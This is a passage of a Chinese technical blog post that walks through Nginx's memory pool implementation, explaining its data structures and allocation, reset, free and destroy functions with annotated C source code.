1;</span><br></pre>      </td>    </tr>  </table></figure><p>多进程模块有一个非常大的好处，就是不需要太多考虑并发锁的问题。</p><p>  Nginx的内存管理是通过内存池来实现的。Nginx的内存池的设计非常的精巧，很多场景下，我们可以将Nginx的内存池实现抽象出来改造成我们开发中的内存池。</p><h3 id="内存池"><a href="#内存池" class="headerlink" title="内存池"></a>内存池</h3><p>一般我们使用malloc/alloc/free等函数来分配和释放内存。但是直接使用这些函数会有一些弊端：</p><ol>  <li>    <p>      虽然系统自带的ptmalloc内存分配管理器，也有自己的内存优化管理方案（申请内存块以及将内存交还给系统都有自己的优化方案，具体可以研究一下ptmalloc的源码），但是直接使用malloc/alloc/free，仍然会导致内存分配的性能比较低。    </p>  </li>  <li>    <p>      频繁使用这些函数分配和释放内存，会导致内存碎片，不容易让系统直接回收内存。典型的例子就是大并发频繁分配和回收内存，会导致进程的内存产生碎片，并且不会立马被系统回收。    </p>  </li>  <li>    <p>容易产生内存泄露。</p>  </li></ol><p>使用内存池分配内存有几点好处：</p><ol>  <li>    <p>提升内存分配效率。不需要每次分配内存都执行malloc/alloc等函数。</p>  </li>  <li>    <p>让内存的管理变得更加简单。内存的分配都会在一块大的内存上，回收的时候只需要回收大块内存就能将所有的内存回收，防止了内存管理混乱和内存泄露问题。    </p>  </li></ol><h3 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h3><p>先看ngx_palloc.h里面的结构体定义：<br><strong>ngx_pool_t 内存池主结构</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * Nginx 内存池数据结构</span><br><span class="line"> */</span><br><span class="line">struct ngx_pool_s &#123;</span><br><span class="line">    ngx_pool_data_t       d;        /* 内存池的数据区域*/</span><br><span class="line">    size_t                max;      /* 最大每次可分配内存 */</span><br><span class="line">    ngx_pool_t           *current;  /* 指向当前的内存池指针地址。ngx_pool_t链表上最后一个缓存池结构*/</span><br><span class="line">    ngx_chain_t          *chain;    /* 缓冲区链表 */</span><br><span class="line">    ngx_pool_large_t     *large;    /* 存储大数据的链表 */</span><br><span class="line">    ngx_pool_cleanup_t   *cleanup;  /* 可自定义回调函数，清除内存块分配的内存 */</span><br><span class="line">    ngx_log_t            *log;      /* 日志 */</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>ngx_pool_data_t 数据区域结构</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">typedef struct &#123;</span><br><span class="line">    u_char               *last;  /* 内存池中未使用内存的开始节点地址 */</span><br><span class="line">    u_char               *end;   /* 内存池的结束地址 */</span><br><span class="line">    ngx_pool_t           *next;  /* 指向下一个内存池 */</span><br><span class="line">    ngx_uint_t            failed;/* 失败次数 */</span><br><span class="line">&#125; ngx_pool_data_t;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>ngx_pool_large_t 大数据块结构</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">struct ngx_pool_large_s &#123;</span><br><span class="line">    ngx_pool_large_t     *next;   /* 指向下一个存储地址 通过这个地址可以知道当前块长度 */</span><br><span class="line">    void                 *alloc;  /* 数据块指针地址 */</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>ngx_pool_cleanup_t 自定义清理回调的数据结构</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">struct ngx_pool_cleanup_s &#123;</span><br><span class="line">    ngx_pool_cleanup_pt   handler;  /* 清理的回调函数 */</span><br><span class="line">    void                 *data;     /* 指向存储的数据地址 */</span><br><span class="line">    ngx_pool_cleanup_t   *next;     /* 下一个ngx_pool_cleanup_t */</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><ol>  <li>    <p>      Nginx的内存池会放在ngx_pool_t的数据结构上（ngx_pool_data_t用于记录内存块block的可用地址空间和内存块尾部）。当初始化分配的内存块大小不能满足需求的时候，Nginx就会调用ngx_palloc_block函数来分配一个新的内存块，通过链表的形式连接起来。    </p>  </li>  <li>    <p>      当申请的内存大于pool-&gt;max的值的时候，Nginx就会单独分配一块large的内存块，会放置在pool-&gt;large的链表结构上。    </p>  </li>  <li>    <p>pool-&gt;cleanup的链表结构主要存放需要通过回调函数清理的内存数据。（例如文件描述符）</p>  </li></ol><h3 id="创建内存池ngx-create-pool"><a href="#创建内存池ngx-create-pool" class="headerlink" title="创建内存池ngx_create_pool"></a>创建内存池ngx_create_pool</h3><p>调用ngx_create_pool这个方法就可以创建一个内存池。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 创建一个内存池</span><br><span class="line"> */</span><br><span class="line">ngx_pool_t *</span><br><span class="line">ngx_create_pool(size_t size, ngx_log_t *log) &#123;</span><br><span class="line">    ngx_pool_t *p;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * 相当于分配一块内存 ngx_alloc(size, log)</span><br><span class="line">     */</span><br><span class="line">    p = ngx_memalign(NGX_POOL_ALIGNMENT, size, log);</span><br><span class="line">    if (p == NULL) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * Nginx会分配一块大内存，其中内存头部存放ngx_pool_t本身内存池的数据结构</span><br><span class="line">     * ngx_pool_data_t  p-&gt;d 存放内存池的数据部分（适合小于p-&gt;max的内存块存储）</span><br><span class="line">     * p-&gt;large 存放大内存块列表</span><br><span class="line">     * p-&gt;cleanup 存放可以被回调函数清理的内存块（该内存块不一定会在内存池上面分配）</span><br><span class="line">     */</span><br><span class="line">    p-&gt;d.last = (u_char *) p + sizeof(ngx_pool_t); //内存开始地址，指向ngx_pool_t结构体之后数据取起始位置</span><br><span class="line">    p-&gt;d.end = (u_char *) p + size; //内存结束地址</span><br><span class="line">    p-&gt;d.next = NULL; //下一个ngx_pool_t 内存池地址</span><br><span class="line">    p-&gt;d.failed = 0; //失败次数</span><br><span class="line"> </span><br><span class="line">    size = size - sizeof(ngx_pool_t);</span><br><span class="line">    p-&gt;max = (size &lt; NGX_MAX_ALLOC_FROM_POOL) ? size : NGX_MAX_ALLOC_FROM_POOL;</span><br><span class="line"> </span><br><span class="line">    /* 只有缓存池的父节点，才会用到下面的这些  ，子节点只挂载在p-&gt;d.next,并且只负责p-&gt;d的数据内容*/</span><br><span class="line">    p-&gt;current = p;</span><br><span class="line">    p-&gt;chain = NULL;</span><br><span class="line">    p-&gt;large = NULL;</span><br><span class="line">    p-&gt;cleanup = NULL;</span><br><span class="line">    p-&gt;log = log;</span><br><span class="line"> </span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="销毁内存池ngx-destroy-pool"><a href="#销毁内存池ngx-destroy-pool" class="headerlink" title="销毁内存池ngx_destroy_pool"></a>销毁内存池ngx_destroy_pool</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 销毁内存池。</span><br><span class="line"> */</span><br><span class="line">void ngx_destroy_pool(ngx_pool_t *pool) &#123;</span><br><span class="line">    ngx_pool_t *p, *n;</span><br><span class="line">    ngx_pool_large_t *l;</span><br><span class="line">    ngx_pool_cleanup_t *c;</span><br><span class="line"> </span><br><span class="line">    /* 首先清理pool-&gt;cleanup链表 */</span><br><span class="line">    for (c = pool-&gt;cleanup; c; c = c-&gt;next) &#123;</span><br><span class="line">        /* handler 为一个清理的回调函数 */</span><br><span class="line">        if (c-&gt;handler) &#123;</span><br><span class="line">            ngx_log_debug1(NGX_LOG_DEBUG_ALLOC, pool-&gt;log, 0,</span><br><span class="line">                    &quot;run cleanup: %p&quot;, c);</span><br><span class="line">            c-&gt;handler(c-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* 清理pool-&gt;large链表（pool-&gt;large为单独的大数据内存块）  */</span><br><span class="line">    for (l = pool-&gt;large; l; l = l-&gt;next) &#123;</span><br><span class="line"> </span><br><span class="line">        ngx_log_debug1(NGX_LOG_DEBUG_ALLOC, pool-&gt;log, 0, &quot;free: %p&quot;, l-&gt;alloc);</span><br><span class="line"> </span><br><span class="line">        if (l-&gt;alloc) &#123;</span><br><span class="line">            ngx_free(l-&gt;alloc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">#if (NGX_DEBUG)</span><br><span class="line"> </span><br><span class="line">    /*</span><br><span class="line">     * we could allocate the pool-&gt;log from this pool</span><br><span class="line">     * so we cannot use this log while free()ing the pool</span><br><span class="line">     */</span><br><span class="line"> </span><br><span class="line">    for (p = pool, n = pool-&gt;d.next; /* void */; p = n, n = n-&gt;d.next) &#123;</span><br><span class="line">        ngx_log_debug2(NGX_LOG_DEBUG_ALLOC, pool-&gt;log, 0,</span><br><span class="line">                &quot;free: %p, unused: %uz&quot;, p, p-&gt;d.end - p-&gt;d.last);</span><br><span class="line"> </span><br><span class="line">        if (n == NULL) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">    /* 对内存池的data数据区域进行释放 */</span><br><span class="line">    for (p = pool, n = pool-&gt;d.next; /* void */; p = n, n = n-&gt;d.next) &#123;</span><br><span class="line">        ngx_free(p);</span><br><span class="line"> </span><br><span class="line">        if (n == NULL) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="重设内存池ngx-reset-pool"><a href="#重设内存池ngx-reset-pool" class="headerlink" title="重设内存池ngx_reset_pool"></a>重设内存池ngx_reset_pool</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 重设内存池</span><br><span class="line"> */</span><br><span class="line">void ngx_reset_pool(ngx_pool_t *pool) &#123;</span><br><span class="line">    ngx_pool_t *p;</span><br><span class="line">    ngx_pool_large_t *l;</span><br><span class="line"> </span><br><span class="line">    /* 清理pool-&gt;large链表（pool-&gt;large为单独的大数据内存块）  */</span><br><span class="line">    for (l = pool-&gt;large; l; l = l-&gt;next) &#123;</span><br><span class="line">        if (l-&gt;alloc) &#123;</span><br><span class="line">            ngx_free(l-&gt;alloc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    pool-&gt;large = NULL;</span><br><span class="line"> </span><br><span class="line">    /* 循环重新设置内存池data区域的 p-&gt;d.last；data区域数据并不擦除*/</span><br><span class="line">    for (p = pool; p; p = p-&gt;d.next) &#123;</span><br><span class="line">        p-&gt;d.last = (u_char *) p + sizeof(ngx_pool_t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="使用内存池分配一块内存ngx-palloc和ngx-pnalloc"><a href="#使用内存池分配一块内存ngx-palloc和ngx-pnalloc" class="headerlink" title="使用内存池分配一块内存ngx_palloc和ngx_pnalloc"></a>使用内存池分配一块内存ngx_palloc和ngx_pnalloc</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 内存池分配一块内存，返回void类型指针</span><br><span class="line"> */</span><br><span class="line">void *</span><br><span class="line">ngx_palloc(ngx_pool_t *pool, size_t size) &#123;</span><br><span class="line">    u_char *m;</span><br><span class="line">    ngx_pool_t *p;</span><br><span class="line"> </span><br><span class="line">    /* 判断每次分配的内存大小，如果超出pool-&gt;max的限制，则需要走大数据内存分配策略 */</span><br><span class="line">    if (size &lt;= pool-&gt;max) &#123;</span><br><span class="line"> </span><br><span class="line">        p = pool-&gt;current;</span><br><span class="line"> </span><br><span class="line">        /*</span><br><span class="line">         * 循环读取缓存池链p-&gt;d.next的各个的ngx_pool_t节点，</span><br><span class="line">         * 如果剩余的空间可以容纳size，则返回指针地址</span><br><span class="line">         *</span><br><span class="line">         * 这边的循环，实际上最多只有4次，具体可以看ngx_palloc_block函数</span><br><span class="line">         * */</span><br><span class="line">        do &#123;</span><br><span class="line">            /* 对齐操作,会损失内存，但是提高内存使用速度 */</span><br><span class="line">            m = ngx_align_ptr(p-&gt;d.last, NGX_ALIGNMENT);</span><br><span class="line"> </span><br><span class="line">            if ((size_t)(p-&gt;d.end - m) &gt;= size) &#123;</span><br><span class="line">                p-&gt;d.last = m + size;</span><br><span class="line"> </span><br><span class="line">                return m;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            p = p-&gt;d.next;</span><br><span class="line"> </span><br><span class="line">        &#125; while (p);</span><br><span class="line"> </span><br><span class="line">        /* 如果没有缓存池空间没有可以容纳大小为size的内存块，则需要重新申请一个缓存池pool节点 */</span><br><span class="line">        return ngx_palloc_block(pool, size);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* 走大数据分配策略 ，在pool-&gt;large链表上分配 */</span><br><span class="line">    return ngx_palloc_large(pool, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * 内存池分配一块内存，返回void类型指针</span><br><span class="line"> * 不考虑对齐情况</span><br><span class="line"> */</span><br><span class="line">void *</span><br><span class="line">ngx_pnalloc(ngx_pool_t *pool, size_t size) &#123;</span><br><span class="line">    u_char *m;</span><br><span class="line">    ngx_pool_t *p;</span><br><span class="line"> </span><br><span class="line">    /* 判断每次分配的内存大小，如果超出pool-&gt;max的限制，则需要走大数据内存分配策略 */</span><br><span class="line">    if (size &lt;= pool-&gt;max) &#123;</span><br><span class="line"> </span><br><span class="line">        p = pool-&gt;current;</span><br><span class="line"> </span><br><span class="line">        /* 循环读取数据区域的各个ngx_pool_t缓存池链，如果剩余的空间可以容纳size，则返回指针地址*/</span><br><span class="line">        do &#123;</span><br><span class="line">            m = p-&gt;d.last; //分配的内存块的地址</span><br><span class="line"> </span><br><span class="line">            if ((size_t)(p-&gt;d.end - m) &gt;= size) &#123;</span><br><span class="line">                p-&gt;d.last = m + size;</span><br><span class="line"> </span><br><span class="line">                return m;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            p = p-&gt;d.next;</span><br><span class="line"> </span><br><span class="line">        &#125; while (p);</span><br><span class="line"> </span><br><span class="line">        /* 如果没有缓存池空间没有可以容纳大小为size的内存块，则需要重新申请一个缓存池*/</span><br><span class="line">        return ngx_palloc_block(pool, size);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* 走大数据分配策略 */</span><br><span class="line">    return ngx_palloc_large(pool, size);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>内存分配逻辑:</strong></p><ol>  <li>    <p>分配一块内存，如果分配的内存size小于内存池的pool-&gt;max的限制，则属于小内存块分配，走小内存块分配逻辑；否则走大内存分配逻辑。    </p>  </li>  <li>    <p>      小内存分配逻辑：循环读取pool-&gt;d上的内存块，是否有足够的空间容纳需要分配的size，如果可以容纳，则直接分配内存；否则内存池需要申请新的内存块，调用ngx_palloc_block。    </p>  </li>  <li>    <p>      大内存分配逻辑：当分配的内存size大于内存池的pool-&gt;max的限制，则会直接调用ngx_palloc_large方法申请一块独立的内存块，并且将内存块挂载到pool-&gt;large的链表上进行统一管理。    </p>  </li></ol><p>ngx_palloc_block，内存池扩容：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 申请一个新的缓存池 ngx_pool_t</span><br><span class="line"> * 新的缓存池会挂载在主缓存池的 数据区域 （pool-&gt;d-&gt;next）</span><br><span class="line"> */</span><br><span class="line">static void *</span><br><span class="line">ngx_palloc_block(ngx_pool_t *pool, size_t size) &#123;</span><br><span class="line">    u_char *m;</span><br><span class="line">    size_t psize;</span><br><span class="line">    ngx_pool_t *p, *new, *current;</span><br><span class="line"> </span><br><span class="line">    psize = (size_t)(pool-&gt;d.end - (u_char *) pool);</span><br><span class="line"> </span><br><span class="line">    /* 申请新的块 */</span><br><span class="line">    m = ngx_memalign(NGX_POOL_ALIGNMENT, psize, pool-&gt;log);</span><br><span class="line">    if (m == NULL) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    new = (ngx_pool_t *) m;</span><br><span class="line"> </span><br><span class="line">    new-&gt;d.end = m + psize;</span><br><span class="line">    new-&gt;d.next = NULL;</span><br><span class="line">    new-&gt;d.failed = 0;</span><br><span class="line"> </span><br><span class="line">    /* 分配size大小的内存块，返回m指针地址 */</span><br><span class="line">    m += sizeof(ngx_pool_data_t);</span><br><span class="line">    m = ngx_align_ptr(m, NGX_ALIGNMENT);</span><br><span class="line">    new-&gt;d.last = m + size;</span><br><span class="line"> </span><br><span class="line">    current = pool-&gt;current;</span><br><span class="line"> </span><br><span class="line">    /**</span><br><span class="line">     * 缓存池的pool数据结构会挂载子节点的ngx_pool_t数据结构</span><br><span class="line">     * 子节点的ngx_pool_t数据结构中只用到pool-&gt;d的结构，只保存数据</span><br><span class="line">     * 每添加一个子节点，p-&gt;d.failed就会+1，当添加超过4个子节点的时候，</span><br><span class="line">     * pool-&gt;current会指向到最新的子节点地址</span><br><span class="line">     *</span><br><span class="line">     * 这个逻辑主要是为了防止pool上的子节点过多，导致每次ngx_palloc循环pool-&gt;d.next链表</span><br><span class="line">     * 将pool-&gt;current设置成最新的子节点之后，每次最大循环4次，不会去遍历整个缓存池链表</span><br><span class="line">     */</span><br><span class="line">    for (p = current; p-&gt;d.next; p = p-&gt;d.next) &#123;</span><br><span class="line">        if (p-&gt;d.failed++ &gt; 4) &#123;</span><br><span class="line">            current = p-&gt;d.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    p-&gt;d.next = new;</span><br><span class="line"> </span><br><span class="line">    /* 最终这个还是没变 */</span><br><span class="line">    pool-&gt;current = current ? current : new;</span><br><span class="line"> </span><br><span class="line">    return m;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>分配一块大内存，挂载到pool-&gt;large链表上ngx_palloc_large</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 当分配的内存块大小超出pool-&gt;max限制的时候,需要分配在pool-&gt;large上</span><br><span class="line"> */</span><br><span class="line">static void *</span><br><span class="line">ngx_palloc_large(ngx_pool_t *pool, size_t size) &#123;</span><br><span class="line">    void *p;</span><br><span class="line">    ngx_uint_t n;</span><br><span class="line">    ngx_pool_large_t *large;</span><br><span class="line"> </span><br><span class="line">    /* 分配一块新的大内存块 */</span><br><span class="line">    p = ngx_alloc(size, pool-&gt;log);</span><br><span class="line">    if (p == NULL) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    n = 0;</span><br><span class="line"> </span><br><span class="line">    /* 去pool-&gt;large链表上查询是否有NULL的，只在链表上往下查询3次，主要判断大数据块是否有被释放的，如果没有则只能跳出*/</span><br><span class="line">    for (large = pool-&gt;large; large; large = large-&gt;next) &#123;</span><br><span class="line">        if (large-&gt;alloc == NULL) &#123;</span><br><span class="line">            large-&gt;alloc = p;</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if (n++ &gt; 3) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /* 分配一个ngx_pool_large_t 数据结构 */</span><br><span class="line">    large = ngx_palloc(pool, sizeof(ngx_pool_large_t));</span><br><span class="line">    if (large == NULL) &#123;</span><br><span class="line">        ngx_free(p); //如果分配失败，删除内存块</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    large-&gt;alloc = p;</span><br><span class="line">    large-&gt;next = pool-&gt;large;</span><br><span class="line">    pool-&gt;large = large;</span><br><span class="line"> </span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>大内存块的释放ngx_pfree</p><p>内存池释放需要走ngx_destroy_pool，独立大内存块的单独释放，可以走ngx_pfree方法。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 大内存块释放  pool-&gt;large</span><br><span class="line"> */</span><br><span class="line">ngx_int_t ngx_pfree(ngx_pool_t *pool, void *p) &#123;</span><br><span class="line">    ngx_pool_large_t *l;</span><br><span class="line"> </span><br><span class="line">    /* 在pool-&gt;large链上循环搜索，并且只释放内容区域，不释放ngx_pool_large_t数据结构*/</span><br><span class="line">    for (l = pool-&gt;large; l; l = l-&gt;next) &#123;</span><br><span class="line">        if (p == l-&gt;alloc) &#123;</span><br><span class="line">            ngx_log_debug1(NGX_LOG_DEBUG_ALLOC, pool-&gt;log, 0,</span><br><span class="line">                    &quot;free: %p&quot;, l-&gt;alloc);</span><br><span class="line">            ngx_free(l-&gt;alloc);</span><br><span class="line">            l-&gt;alloc = NULL;</span><br><span class="line"> </span><br><span class="line">            return NGX_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return NGX_DECLINED;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>cleanup机制 可以回调函数清理数据</p><p>  Nginx的内存池cleanup机制，设计的非常巧妙。pool-&gt;cleanup本身是一个链表，每个ngx_pool_cleanup_t的数据结构上，保存着内存数据的本身cleanup-&gt;data和回调清理函数cleanup-&gt;handler。</p><p>  